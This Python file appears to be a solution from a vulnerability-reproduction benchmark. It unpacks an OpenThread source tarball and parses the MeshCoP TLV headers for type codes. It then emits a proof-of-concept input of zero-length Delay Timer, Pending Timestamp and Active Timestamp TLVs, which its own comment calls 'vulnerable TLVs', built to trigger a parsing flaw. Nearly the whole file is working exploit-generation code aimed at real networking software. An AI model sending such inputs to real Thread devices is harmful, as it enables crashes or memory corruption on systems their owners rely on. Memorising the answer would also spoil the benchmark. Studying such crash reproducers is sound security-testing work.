import os
import re
import tarfile
import tempfile
import shutil


def parse_int_literal(s: str):
    s = s.strip()
    # Remove common suffixes like u, U, l, L, ul, UL, etc.
    s = re.sub(r'[uUlL]+$', '', s)
    m = re.match(r'0[xX]([0-9a-fA-F]+)', s)
    if m:
        try:
            return int(m.group(1), 16)
        except ValueError:
            return None
    m = re.match(r'(\d+)', s)
    if m:
        try:
            return int(m.group(1), 10)
        except ValueError:
            return None
    return None


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Sensible defaults if parsing fails (reasonable guesses for OpenThread MeshCoP TLVs)
        active_type = 0x0e
        pending_type = 0x0f
        delay_type = 0x06
        header_size = 2  # type + 1-byte length

        tmpdir = None
        try:
            tmpdir = tempfile.mkdtemp(prefix="src_")
            try:
                with tarfile.open(src_path, "r:*") as tar:
                    tar.extractall(tmpdir)
            except Exception:
                # If extraction fails, fall back to defaults
                tmpdir = None

            if tmpdir is not None:
                found_enum = False

                for root, _, files in os.walk(tmpdir):
                    for name in files:
                        if not name.endswith((".hpp", ".h", ".hh", ".hxx", ".hpp.in")):
                            continue
                        path = os.path.join(root, name)
                        try:
                            with open(path, "r", errors="ignore") as f:
                                txt = f.read()
                        except Exception:
                            continue

                        # We look for the MeshCoP TLV definition file.
                        if "kActiveTimestamp" not in txt or "enum" not in txt:
                            continue

                        # Try to infer header size from Tlv class definition in this file.
                        tlv_class_match_iter = re.finditer(r'class\s+Tlv\b[^{}]*{([^}]*)}', txt, re.S)
                        for m_tlv in tlv_class_match_iter:
                            body = m_tlv.group(1)
                            if "mType" in body and "mLength" in body:
                                if re.search(r'\buint8_t\s+mLength\b', body):
                                    header_size = 2
                                elif re.search(r'\buint16_t\s+mLength\b', body):
                                    header_size = 3
                                # Once we find a plausible Tlv class, we stop looking further.
                                break

                        # Parse the enum Type : uint8_t { ... }
                        m_enum = re.search(r'enum\s+Type\s*:\s*[^{}]+{([^}]*)}', txt, re.S)
                        if not m_enum:
                            # Some versions might omit the scoped base type; try without it.
                            m_enum = re.search(r'enum\s+Type\s*{([^}]*)}', txt, re.S)
                            if not m_enum:
                                continue

                        body = m_enum.group(1)
                        enum_map = {}
                        current_val = None

                        for item in re.split(r',', body):
                            # Strip comments
                            item = re.sub(r'//.*', '', item)
                            item = re.sub(r'/\*.*?\*/', '', item, flags=re.S)
                            item = item.strip()
                            if not item:
                                continue

                            m_item = re.match(r'([A-Za-z_][A-Za-z0-9_]*)\s*(?:=\s*([^,]+))?$', item)
                            if not m_item:
                                continue

                            name_tok, val_expr = m_item.group(1), m_item.group(2)
                            if val_expr is not None:
                                # Only handle simple integer literals.
                                v = parse_int_literal(val_expr.strip().split()[0])
                                if v is None:
                                    continue
                                current_val = v
                            else:
                                if current_val is None:
                                    current_val = 0
                                else:
                                    current_val += 1

                            enum_map[name_tok] = current_val

                        # Update our type IDs if present in this enum.
                        if "kActiveTimestamp" in enum_map:
                            active_type = enum_map["kActiveTimestamp"]
                        if "kPendingTimestamp" in enum_map:
                            pending_type = enum_map["kPendingTimestamp"]
                        if "kDelayTimer" in enum_map:
                            delay_type = enum_map["kDelayTimer"]

                        found_enum = True
                        break

                    if found_enum:
                        break

        except Exception:
            # On any unexpected failure, fall back to defaults.
            pass
        finally:
            if tmpdir is not None:
                try:
                    shutil.rmtree(tmpdir)
                except Exception:
                    pass

        # Helper to construct a TLV with zero-length value for the given type.
        def make_zero_len_tlv(t_type: int) -> bytes:
            # First byte is type, remaining (header_size-1) bytes are zero for length field.
            if header_size < 2:
                # Fallback to at least 2 bytes (type + 1-byte length).
                return bytes([t_type & 0xFF, 0])
            return bytes([t_type & 0xFF]) + b"\x00" * (header_size - 1)

        # Build a small dataset with several zero-length vulnerable TLVs,
        # ensuring the last one is an Active Timestamp TLV placed at the end.
        tlvs = [
            make_zero_len_tlv(delay_type),
            make_zero_len_tlv(pending_type),
            make_zero_len_tlv(active_type),
        ]

        poc = b"".join(tlvs)
        return poc